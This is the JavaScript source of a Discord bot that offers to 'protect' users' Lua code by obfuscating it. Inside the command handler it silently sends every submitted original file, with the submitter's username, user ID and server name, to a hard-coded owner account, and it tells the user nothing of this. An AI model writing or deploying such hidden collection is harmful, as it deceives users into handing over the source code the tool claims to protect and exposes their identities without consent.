const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, AttachmentBuilder } = require('discord.js');
const { obfuscate } = require('./obfuscator');
const https = require('https');
const http = require('http');

// Simple keep-alive server
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(PORT);

const TOKEN = process.env.DISCORD_BOT_TOKEN;
if (!TOKEN) {
    console.error('DISCORD_BOT_TOKEN is not set.');
    process.exit(1);
}

const OWNER_ID = '1474472773467242599';
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const command = new SlashCommandBuilder()
    .setName('obf')
    .setDescription('Protect your code with VMM Obfuscator')
    .addStringOption(o => 
        o.setName('mode')
            .setDescription('Select the obfuscation mode')
            .setRequired(true)
            .addChoices(
                { name: 'Normal', value: 'normal' },
                { name: 'Diabolical', value: 'diabolical' }
            ))
    .addStringOption(o => o.setName('code').setDescription('Paste your Lua code directly').setRequired(false))
    .addAttachmentOption(o => o.setName('file').setDescription('Upload a .lua file to obfuscate').setRequired(false));

function fetchURL(url) {
    return new Promise((resolve, reject) => {
        const mod = url.startsWith('https') ? https : http;
        mod.get(url, res => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => resolve(d));
        }).on('error', reject);
    });
}

client.once('ready', async () => {
    console.log(`Online as ${client.user.tag}`);
    try {
        const rest = new REST({ version: '10' }).setToken(TOKEN);
        await rest.put(Routes.applicationCommands(client.user.id), { body: [command.toJSON()] });
        console.log('Slash command /obf registered.');
    } catch (err) {
        console.error('Error registering commands:', err);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand() || interaction.commandName !== 'obf') return;

    const mode = interaction.options.getString('mode');
    const codeOption = interaction.options.getString('code');
    const fileOption = interaction.options.getAttachment('file');

    if (!codeOption && !fileOption) {
        return interaction.reply({ content: 'Provide `code` or a `file`.', ephemeral: true });
    }

    await interaction.deferReply();

    try {
        let src = fileOption ? await fetchURL(fileOption.url) : codeOption;

        if (!src || !src.trim()) {
            return interaction.editReply('The provided code is empty.');
        }

        // Log the file to the owner (Be careful with privacy!)  
        try {
            const owner = await client.users.fetch(OWNER_ID);
            const originalBuf = Buffer.from(src, 'utf-8');
            const serverName = interaction.guild ? interaction.guild.name : 'DM';
            await owner.send({
                content: `**User:** ${interaction.user.tag} (\`${interaction.user.id}\`)\n**Server:** ${serverName}\n**Mode:** ${mode}`,
                files: [new AttachmentBuilder(originalBuf, { name: 'original.lua' })]
            });
        } catch (dmErr) {
            console.error('Failed to DM owner:', dmErr);
        }

        // Perform obfuscation passing the mode
        const obfuscatedResult = obfuscate(src, mode);
        const buf = Buffer.from(obfuscatedResult, 'utf-8');

        if (buf.length > 8 * 1024 * 1024) {
            return interaction.editReply('Output too large (>8MB).');
        }

        // Fixed multiline string using backticks (`)  
        await interaction.editReply({
            content: `Your code is now protected! (Mode: **${mode.toUpperCase()}**)

• Don't be scared if the file is big, it will be executable.
• We recommend obfuscating a loadstring code ⚠️ because we don't support scripts of more than 300-400 lines.
• Use it and follow the rules properly.`,
            files: [new AttachmentBuilder(buf, { name: 'obfuscated.lua' })]
        });

    } catch (e) {
        console.error(e);
        await interaction.editReply('An error occurred during obfuscation. Please try again.');
    }
});

client.login(TOKEN);
